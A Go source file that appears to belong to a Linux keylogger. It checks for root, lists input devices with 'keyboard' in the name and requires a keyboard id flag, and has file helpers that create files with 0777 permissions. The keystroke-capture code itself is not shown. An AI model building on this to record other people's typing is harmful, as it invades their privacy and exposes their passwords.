package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"strings"
)

var logfile *os.File

func ReadLogFile(f string) string {
	b, err := ioutil.ReadFile(f)
	checkErr(err)
	return string(b)
}
func OpenFile(path string) *os.File {
	file, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE, 0777)
	checkErr(err)
	return file
}
func checkErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
func checkRoot() error {
	u, err := user.Current()
	if err != nil {
		return err
	}
	if u.Uid != "0" {
		return fmt.Errorf("Cannot read device files. Are you running as root?")
	}
	return nil
}

func getKeyboardID() int {
	var id int
	flag.IntVar(&id, "kbid", -1, "keyboard id required")
	flag.Parse()
	devs, err := NewDevices()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	keymap := map[int]string{}
	if id == -1 {
		fmt.Println("You must select one keyboard !")
		fmt.Println("Please run keylogger with option --kbid [id number] ")
		for _, val := range devs {
			if strings.Contains(strings.ToLower(val.Name), "keyboard") {
				fmt.Println("Id->", val.Id, "Device->", val.Name)
				keymap[val.Id] = val.Name
			}
		}
		fmt.Println("Exit ...")
		os.Exit(1)
	} else {
		for _, val := range devs {
			if strings.Contains(strings.ToLower(val.Name), "keyboard") {
				keymap[val.Id] = val.Name
			}
		}
	}
	if _, ok := keymap[id]; !ok {
		fmt.Println("Wrong id ...")
		os.Exit(1)
	}

	return id
}
